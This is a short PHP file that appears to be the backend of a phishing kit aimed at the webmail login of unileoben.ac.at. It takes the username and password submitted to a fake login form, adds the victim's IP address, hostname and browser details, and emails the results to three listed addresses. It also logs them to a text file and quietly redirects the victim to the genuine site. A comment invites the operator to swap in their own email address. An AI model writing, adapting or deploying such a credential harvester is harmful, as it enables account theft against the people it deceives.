<?php
header("Location: https://nmail.unileoben.ac.at/");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Login-----------------------\n";
$message .= "Username      : ".$_POST['Username']."\n";
$message .= "Password         : ".$_POST['Password']."\n";
$message .= "---------------Created BY-------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
//change ur email here
$send = "g_Adrian@aol.com, sameera.hassan21@yahoo.com, benomoye@gmail.com";
$subject = "Result from unileoben.ac.at| $ip";
$headers = "From:Result<resultz@>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
}
$fp = fopen("rezults.txt","a");
fputs($fp,$message);
fclose($fp);    
     
?>